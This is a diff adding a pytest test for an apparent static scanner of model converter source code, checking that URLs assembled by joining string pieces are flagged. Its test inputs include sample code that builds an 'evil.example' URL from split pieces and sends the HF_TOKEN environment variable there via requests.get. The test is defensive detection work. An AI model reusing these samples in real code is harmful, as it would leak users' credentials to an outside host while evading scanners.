@@ -4352,6 +4352,41 @@ def test_a_rebound_builder_and_a_budget_for_the_folding_itself():
     assert time.perf_counter() - started < 20
 
 
+def test_a_join_over_pieces_this_cannot_enumerate_refuses_it():
+    """"".join(x for x in ("https", "://evil.example/c")) is a whole URL, and
+    the walk sees two pieces neither of which carries a scheme. Only a sequence
+    written out is folded, and returning no text for anything else left the
+    destination unnamed rather than unreadable.
+
+    One argument, which leaves os.path.join(a, b) alone, and a sequence written
+    out is still folded, which is the shape a converter would actually use. No file that reaches this allowance joins anything:
+    gguf-py/gguf/utility.py has no .join at all.
+    """
+    scan_converter_source = _load(
+        "converter_scan_join_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
+    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
+    for body in (
+        'url = "".join(x for x in ("https", "://evil.example/c"))\n' + send,
+        'url = "".join([x for x in ("https", "://evil.example/c")])\n' + send,
+        'url = "".join(pieces)\n' + send,
+        'url = "".join(map(str, ("https", "://evil.example/c")))\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    # Written out, and joined on a path this file states in full: still read.
+    assert scan_converter_source(
+        preamble + 'url = "/".join([HUB, "api", "models"])\n' + send
+    ) == []
+    # os.path.join is not a separator joining pieces.
+    assert scan_converter_source(
+        preamble + 'import os.path\np = os.path.join(root, name)\n'
+        + 'url = f"{HUB}/api"\n' + send
+    ) == []
+
+
 def test_the_hub_narrowing_does_not_reach_any_other_rule():
     """Only the env-harvest combination is narrowed. A credential stealer or a
     remote-code loader that happens to mention the hub is untouched.
